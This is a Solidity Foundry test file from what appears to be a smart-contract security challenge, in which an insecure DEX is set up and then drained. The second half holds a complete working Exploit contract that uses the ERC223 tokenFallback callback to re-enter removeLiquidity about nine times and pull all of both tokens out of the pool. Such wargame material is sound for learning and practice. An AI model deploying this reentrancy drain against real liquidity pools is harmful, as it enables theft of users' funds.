// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";


contract Challenge2Test is Test {
    InsecureDexLP target; 
    IERC20 token0;
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        
        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));
        
        target = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);
        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/  

        Exploit e = new Exploit(address(target));
        token0.approve(address(e), type(uint256).max);
        token1.approve(address(e), type(uint256).max);
        
        e.hack();    

        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
        assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
        assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
        assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");

    }
}



/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 public immutable token0; // this is insecureumToken
    IERC20 public immutable token1; // this is simpleERC223Token
    InsecureDexLP public immutable dex;

    address private immutable _player;

    uint256 public num_reentered;
    bool hacking;
    uint256 _lpAmount;

    constructor(address _dexAddress) {
        _player = msg.sender;
        
        dex = InsecureDexLP(_dexAddress);
        token0 = IERC20(dex.token0());
        token1 = IERC20(dex.token1());

        token1.approve(_dexAddress, type(uint256).max);
        token0.approve(_dexAddress, type(uint256).max);
    }

    function hack() public {
        num_reentered = 0;
        uint256 token0Balance = token0.balanceOf(_player);
        uint256 token1Balance = token1.balanceOf(_player);

        token0.transferFrom(_player, address(this), token0Balance);
        token1.transferFrom(_player, address(this), token1Balance);
        
        dex.addLiquidity(token0Balance, token1Balance);
        _lpAmount = dex.balanceOf(address(this));
        hacking = true;
        dex.removeLiquidity(_lpAmount);
    }
    function tokenFallback(address _sender, uint256 value, bytes calldata data) external {
        if (!hacking) {
            return;
        }
        if (num_reentered > 8) {
            uint256 token0Balance = token0.balanceOf(address(this));
            uint256 token1Balance = token1.balanceOf(address(this));
            token0.transfer(_player, token0Balance);
            token1.transfer(_player, token1Balance);
            return;
        }
        ++num_reentered;
        dex.removeLiquidity(_lpAmount);
    }
}
